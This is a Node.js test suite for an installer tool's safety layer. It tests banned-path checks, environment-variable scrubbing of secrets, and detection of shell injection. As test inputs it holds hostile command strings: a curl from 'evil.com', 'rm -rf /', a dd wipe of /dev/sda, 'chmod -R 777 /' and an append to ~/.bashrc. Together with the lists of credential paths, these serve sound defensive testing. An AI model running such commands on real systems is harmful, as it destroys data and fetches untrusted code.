import test from 'node:test';
import assert from 'node:assert';
import * as path from 'node:path';
import * as os from 'node:os';
import * as fs from 'node:fs';

process.env.GETIT_TEST_MODE = 'true';

import { isPathSafe } from '../src/security/banned-paths.js';
import { getSafeEnv } from '../src/security/env-scrubber.js';
import { sanitizeBashCommand } from '../src/security/input-sanitizer.js';

test('Safety Test Suite: Banned Paths Protection', async (t) => {
  await t.test('should reject path matches to system configuration blocks', () => {
    assert.strictEqual(isPathSafe('/etc'), false, 'Should block /etc');
    assert.strictEqual(isPathSafe('/etc/shadow'), false, 'Should block files inside /etc');
    assert.strictEqual(isPathSafe('/boot/grub'), false, 'Should block /boot');
    assert.strictEqual(isPathSafe('/dev/sda'), false, 'Should block /dev');
    assert.strictEqual(isPathSafe('/root/.bashrc'), false, 'Should block root user folder');
  });

  await t.test('should reject path matches to user-level ssh directory', () => {
    const homeSsh = path.join(os.homedir(), '.ssh');
    assert.strictEqual(isPathSafe(homeSsh), false, 'Should block ~/.ssh');
    assert.strictEqual(isPathSafe(path.join(homeSsh, 'id_rsa')), false, 'Should block ssh key file');
  });

  await t.test('should intercept parent directory traversal attacks (../etc)', () => {
    const homeDir = os.homedir();
    const traversalPath = path.join(homeDir, '../../etc/shadow');
    assert.strictEqual(isPathSafe(traversalPath), false, 'Should resolve traversal path and block it');
  });

  await t.test('should reject operations targeted directly at root directory', () => {
    assert.strictEqual(isPathSafe('/'), false, 'Should block access to root "/"');
  });

  await t.test('should accept standard working directory files', () => {
    const safePath = path.join(os.homedir(), 'projects/installer2/src/index.ts');
    assert.strictEqual(isPathSafe(safePath), true, 'Standard workspace files must be safe');
  });

  await t.test('should resolve symlinks and reject them if they target banned paths', () => {
    const tempSymlink = path.join(os.tmpdir(), `getit-test-symlink-${Date.now()}`);
    try {
      fs.symlinkSync('/etc/shadow', tempSymlink);
      assert.strictEqual(isPathSafe(tempSymlink), false, 'Should block symlink targeting banned path');
    } catch (e) {
      // In some sandboxed environments, symlinks might not be supported/permitted, bypass gracefully
    } finally {
      try {
        if (fs.existsSync(tempSymlink)) {
          fs.unlinkSync(tempSymlink);
        }
      } catch {}
    }
  });
});

test('Safety Test Suite: Environment Scrubbing', async (t) => {
  await t.test('should sterilize active api credentials and third party keys', () => {
    // Populate fake credentials
    process.env.OPENROUTER_API_KEY = 'super_secret_openrouter_api_key_123';
    process.env.GITHUB_TOKEN = 'github_personal_token_xyz';
    process.env.AWS_SECRET_ACCESS_KEY = 'aws_secret_key_456';
    process.env.SAFE_VARIABLE = 'normal_non_sensitive_data';

    try {
      const scrubbed = getSafeEnv();
      
      // Asserts that sensitive keys are removed
      assert.strictEqual(scrubbed.OPENROUTER_API_KEY, undefined, 'Must scrub OPENROUTER_API_KEY');
      assert.strictEqual(scrubbed.GITHUB_TOKEN, undefined, 'Must scrub GITHUB_TOKEN');
      assert.strictEqual(scrubbed.AWS_SECRET_ACCESS_KEY, undefined, 'Must scrub AWS_SECRET_ACCESS_KEY');
      
      // Asserts that safe keys are preserved
      assert.strictEqual(scrubbed.SAFE_VARIABLE, 'normal_non_sensitive_data', 'Must keep non-sensitive vars');
    } finally {
      // Clean up process.env state
      delete process.env.OPENROUTER_API_KEY;
      delete process.env.GITHUB_TOKEN;
      delete process.env.AWS_SECRET_ACCESS_KEY;
      delete process.env.SAFE_VARIABLE;
    }
  });

  await t.test('should match and strip keys dynamically containing sensitive words', () => {
    process.env.MY_DATABASE_PASSWORD = 'db_password_123';
    process.env.SLACK_WEBHOOK_SECRET = 'slack_sec';

    try {
      const scrubbed = getSafeEnv();
      assert.strictEqual(scrubbed.MY_DATABASE_PASSWORD, undefined, 'Must scrub keys matching PASSWORD pattern');
      assert.strictEqual(scrubbed.SLACK_WEBHOOK_SECRET, undefined, 'Must scrub keys matching SECRET pattern');
    } finally {
      delete process.env.MY_DATABASE_PASSWORD;
      delete process.env.SLACK_WEBHOOK_SECRET;
    }
  });

  await t.test('should match and strip keys case-insensitively', () => {
    process.env.my_api_key = 'some_key';
    process.env.My_Aws_Token = 'some_token';
    process.env.DB_PASSWORD = 'pass';
    process.env.private_credential = 'cred';

    try {
      const scrubbed = getSafeEnv();
      assert.strictEqual(scrubbed.my_api_key, undefined, 'Must strip lowercase api key');
      assert.strictEqual(scrubbed.My_Aws_Token, undefined, 'Must strip camelcase aws token');
      assert.strictEqual(scrubbed.DB_PASSWORD, undefined, 'Must strip uppercase password');
      assert.strictEqual(scrubbed.private_credential, undefined, 'Must strip lowercase credential');
    } finally {
      delete process.env.my_api_key;
      delete process.env.My_Aws_Token;
      delete process.env.DB_PASSWORD;
      delete process.env.private_credential;
    }
  });
});

test('Safety Test Suite: Bash Cascade & Shell Injection Detection', async (t) => {
  await t.test('should flag commands containing logical execution chains (&&, ||)', () => {
    const res1 = sanitizeBashCommand('apt-get update && apt-get install -y ripgrep');
    assert.strictEqual(res1.isSafe, false);
    assert.ok(res1.warnings.some(w => w.includes('&&')));

    const res2 = sanitizeBashCommand('ping -c 1 google.com || echo "offline"');
    assert.strictEqual(res2.isSafe, false);
    assert.ok(res2.warnings.some(w => w.includes('||')));
  });

  await t.test('should flag command separation semicolons', () => {
    const res = sanitizeBashCommand('cd ~/.local/bin; ls -la');
    assert.strictEqual(res.isSafe, false);
    assert.ok(res.warnings.some(w => w.includes(';')));
  });

  await t.test('should flag subshells and backticks command expansions', () => {
    const res1 = sanitizeBashCommand('echo `whoami`');
    assert.strictEqual(res1.isSafe, false);
    assert.ok(res1.warnings.some(w => w.includes('`')));

    const res2 = sanitizeBashCommand('echo $(whoami)');
    assert.strictEqual(res2.isSafe, false);
    assert.ok(res2.warnings.some(w => w.includes('$(...)')));
  });

  await t.test('should flag file append and output redirection operators', () => {
    const res1 = sanitizeBashCommand('echo "malicious" >> ~/.bashrc');
    assert.strictEqual(res1.isSafe, false);
    assert.ok(res1.warnings.some(w => w.includes('>>')));

    const res2 = sanitizeBashCommand('curl evil.com > malicious.sh');
    assert.strictEqual(res2.isSafe, false);
    assert.ok(res2.warnings.some(w => w.includes('">"')));
  });

  await t.test('should accept plain simple commands with no cascades', () => {
    const res = sanitizeBashCommand('which curl');
    assert.strictEqual(res.isSafe, true);
    assert.strictEqual(res.warnings.length, 0);
  });

  await t.test('should flag potentially hazardous command patterns (rm -rf, dd, etc.)', () => {
    const rmRfRes = sanitizeBashCommand('rm -rf /');
    assert.strictEqual(rmRfRes.isSafe, false);
    assert.ok(rmRfRes.warnings.some(w => w.includes('potentially hazardous command pattern')));

    const ddRes = sanitizeBashCommand('dd if=/dev/zero of=/dev/sda');
    assert.strictEqual(ddRes.isSafe, false);
    assert.ok(ddRes.warnings.some(w => w.includes('potentially hazardous command pattern')));

    const chmodRes = sanitizeBashCommand('chmod -R 777 /');
    assert.strictEqual(chmodRes.isSafe, false);
    assert.ok(chmodRes.warnings.some(w => w.includes('potentially hazardous command pattern')));
  });
});
